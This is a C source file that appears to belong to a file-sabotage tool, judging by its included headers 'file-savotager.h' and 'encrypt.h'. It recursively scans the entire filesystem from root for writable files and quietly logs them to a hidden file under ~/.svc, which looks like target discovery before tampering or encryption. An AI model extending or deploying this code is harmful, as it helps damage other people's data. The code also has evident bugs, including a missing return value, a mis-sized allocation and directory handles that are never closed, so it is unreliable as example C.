#include "../header/const.h"
#include "../header/file-savotager.h"
#include "../header/encrypt.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <errno.h>

char ** get_file_prefix_filtered(const char * path, const char * prefix) {
    int prefix_len = strlen(prefix);
    char ** ret;
    DIR * curr_dir;
    struct dirent * dirp;
    if ((curr_dir = opendir(path)) == NULL)
        return NULL;
    while((dirp = readdir(curr_dir)) != NULL) {
        if(strncmp(prefix, dirp->d_name, prefix_len) == 0) {
            printf("%s\n", dirp->d_name);
        }
    }
    closedir(curr_dir);
}

char ** get_file_list(const char * path) {
    int ent_cnt = 0;
    int str_len;
    char ** file_arr = malloc(sizeof(char *) * MAX_ENTRY_CNT + 1);
    DIR * dir;
    struct dirent * dirp;

    if ((dir = opendir(path)) == NULL) return NULL;
    while((dirp = readdir(dir)) != NULL) {
        if (strcmp(dirp->d_name, ".") == 0 || strcmp(dirp->d_name, "..") == 0) continue;
        str_len = strlen(dirp->d_name);
        file_arr[ent_cnt++] = (char *) malloc(sizeof(char) * (str_len + 1));
        memset(file_arr[ent_cnt - 1], '\0', str_len + 1);
        strcpy(file_arr[ent_cnt - 1], dirp->d_name);
    }
    file_arr[ent_cnt] = NULL;
    closedir(dir);
    return file_arr;
}

int get_rw_file_list() {
    int saved_stdout = dup(STDOUT_FILENO);
    char file_path[MAX_PATH_LEN] = {'\0',};
    int ret, file_fd;

    sprintf(file_path, "%s/.svc", getenv("HOME"));
    strcat(file_path, "/writable_files");
    file_fd = open(file_path, O_CREAT | O_WRONLY | O_APPEND, S_IRUSR | S_IWUSR);
    if (file_fd < 0) {
        printf("file_path %s: %s\n", file_path, strerror(errno));
    }
    dup2(file_fd, STDOUT_FILENO);
    ret = _get_rw_file_list("/");
    printf("=== WRITABLE FILELIST DONE ===");
    fflush(stdout);
    dup2(saved_stdout, STDOUT_FILENO);
    close(file_fd);
    return ret;
}

int _get_rw_file_list(const char * path) {
    int ret = -1;
    DIR * dir;
    struct dirent * dirp;
    char file_path[MAX_PATH_LEN];

    if ((dir = opendir(path)) == NULL) {
        return -1;
    }
    while((dirp = readdir(dir)) != NULL) {
        memset(file_path, '\0', MAX_PATH_LEN);
        strcpy(file_path, path);
        strcat(file_path, "/");
        strcat(file_path, dirp->d_name);
        if (access(file_path, W_OK) == 0)
            printf("%s\n", file_path);
        if (access(file_path, R_OK) == 0 && dirp->d_type == DT_DIR && strcmp(dirp->d_name, ".") != 0 && strcmp(dirp->d_name, "..") != 0) {
            ret = ret & _get_rw_file_list(file_path);
        }
    }
    return 0;
}